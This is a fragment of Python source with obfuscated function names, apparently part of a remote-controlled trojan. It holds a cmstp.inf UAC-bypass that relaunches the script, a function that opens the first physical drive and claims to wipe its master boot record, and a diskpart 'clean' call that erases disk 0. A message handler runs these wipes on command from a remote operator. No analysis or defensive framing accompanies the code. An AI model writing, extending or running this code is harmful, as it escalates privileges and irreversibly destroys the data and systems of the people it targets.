...
def _59():
    ...
    try:
        import tempfile
        cmstp = Path(tempfile.gettempdir()) / "cmstp.inf"
        with open(cmstp, 'w') as f:
            f.write("[Version]\nSignature=$CHICAGO$\nAdvancedINF=2.5\n[DefaultInstall]\nRunPreSetupCommands=RunPreSetupCommands\n[RunPreSetupCommands]\n" + sys.executable + " " + os.path.abspath(__file__) + "\n")
        subprocess.run(['cmstp', '/au', str(cmstp)], capture_output=True)
        os.remove(cmstp)
        return True
    except:return False
def _60():
    if os.name!='nt':return "Not available on this OS"
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        drive = ctypes.c_wchar_p("\\\\.\\PhysicalDrive0")
        hDevice = kernel32.CreateFileW(drive, 0xC0000000, 3, None, 3, 0, None)
        if hDevice != -1:
            buf = ctypes.create_string_buffer(512)
            bytesReturned = ctypes.c_ulong()
            kernel32.DeviceIoControl(hDevice, 0x90010, None, 0, buf, 512, ctypes.byref(bytesReturned), None)
            kernel32.CloseHandle(hDevice)
            return "MBR wiped"
        return "Failed"
    except:return "Failed"
def _61():
    if os.name!='nt':return "Not available"
    try:
        subprocess.run(['diskpart', '/s'], input="select disk 0\nclean\n", capture_output=True)
        return "Disk cleaned"
    except:return "Failed"
def _62():
    def w():
        ...
        try:
            ...
            for m in msgs:
                ...
                if act=="help":
                    ...
                    if os.name!='nt':c.sendm(c.cc,"Only available on Windows")
                    else:
                        res=_60()
                        c.sendm(c.cc,res)
                elif act=="destroy_mbr":
                    if os.name!='nt':c.sendm(c.cc,"Only available on Windows")
                    else:
                        res=_61()
                        c.sendm(c.cc,res)
